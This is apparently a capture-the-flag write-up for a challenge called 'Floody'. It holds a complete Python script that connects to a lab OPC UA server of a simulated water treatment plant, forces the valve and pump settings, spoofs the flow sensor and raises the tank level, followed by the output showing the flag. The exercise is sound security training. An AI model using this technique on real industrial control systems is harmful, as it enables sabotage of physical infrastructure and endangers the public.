# Floody
Task Force Phoenix has found a flaw in Volnaya’s water treatment plant, its 2:WaterTreatmentPlant object humming via OPC UA, supplying the government’s command center. Sabotage it to flood the complex and disrupt Operation Blackout:  
- Set inlet valve to 100% open,  
- Increase pump speed to 1600 RPM,  
- Spoof flow sensor to 4 L/s,  
- Raise tank water level to 5m

## Solution
system uses the OPC UA protocol (IEC62541):
* https://en.wikipedia.org/wiki/OPC_Unified_Architecture

python framework:
* https://github.com/FreeOpcUa/python-opcua
* https://python-opcua.readthedocs.io/en/latest/opcua.html

script to read out values, manipulate and get flag:
```python
from opcua import Client, ua
import time

client = Client("opc.tcp://94.237.59.89:36899")
client.connect()
objects = client.get_objects_node()
children = objects.get_children()
water_plant = children[1]
water_children = water_plant.get_children()

print('Getting overview ...')
print()

print('Nodes:')
for child in children:
    print(f'  {child.get_display_name().Text}')

print()
print(f'Childs (WaterTreatmentPlant): ')
for child in water_children:
    print(f'  {child.get_display_name().Text}')
    for value in child.get_children():
        print(f'    {value.get_display_name().Text}: {value.get_value()} ({value.nodeid})')

print('Manipulating values (and wait a bit for flag) ...')
pump = client.get_node('ns=2;i=4') # Pump
tank = client.get_node('ns=2;i=6') # Tank
valve = client.get_node('ns=2;i=10') # Valve
sensors = client.get_node('ns=2;i=13') # Sensors

man_pump = ua.Variant(1600.0, ua.VariantType.Float)
man_tank = ua.Variant(5.0, ua.VariantType.Float)
man_valve = ua.Variant(100.0, ua.VariantType.Float)
man_sensors = ua.Variant(4.0, ua.VariantType.Float)

valve.set_value(man_valve)
pump.set_value(man_pump)
sensors.set_value(man_sensors)
tank.set_value(man_tank)

time.sleep(2)
print('Printing new values ...')
print()

for child in water_children:
    print(f'  {child.get_display_name().Text}')
    for value in child.get_children():
        print(f'    {value.get_display_name().Text}: {value.get_value()}')

client.disconnect()
```

result:
```
┌──(venv)─(kali㉿kali)-[~/Desktop/htb/business-2025]
└─$ python opcua-script.py
Getting overview ...

Nodes:
  Server
  WaterTreatmentPlant

Childs (WaterTreatmentPlant): 
  Pump
    Status: True (NumericNodeId(ns=2;i=3))
    Speed: 1200.0 (NumericNodeId(ns=2;i=4))
  Tank
    WaterLevel: 2.4360291972243764 (NumericNodeId(ns=2;i=6))
    Volume: 2500.0 (NumericNodeId(ns=2;i=7))
  Valve
    Status: True (NumericNodeId(ns=2;i=9))
    PercentOpen: 75.0 (NumericNodeId(ns=2;i=10))
  Sensors
    Pressure: 3.1485218492069245 (NumericNodeId(ns=2;i=12))
    FlowRate: 10.075538378535311 (NumericNodeId(ns=2;i=13))
  Maintenance
    SecretLog: Null (NumericNodeId(ns=2;i=15))

Manipulating values (and wait a bit for flag) ...
Printing new values ...

  Pump
    Status: True
    Speed: 1600.0
  Tank
    WaterLevel: 4.939609173145405
    Volume: 2500.0
  Valve
    Status: True
    PercentOpen: 100.0
  Sensors
    Pressure: 3.132828404899001
    FlowRate: 4.117678895399377
  Maintenance
    SecretLog: HTB{w4t3r_tr34tm3nt_0v3rfl0w3d}

┌──(venv)─(kali㉿kali)-[~/Desktop/htb/business-2025]
└─$ 
```
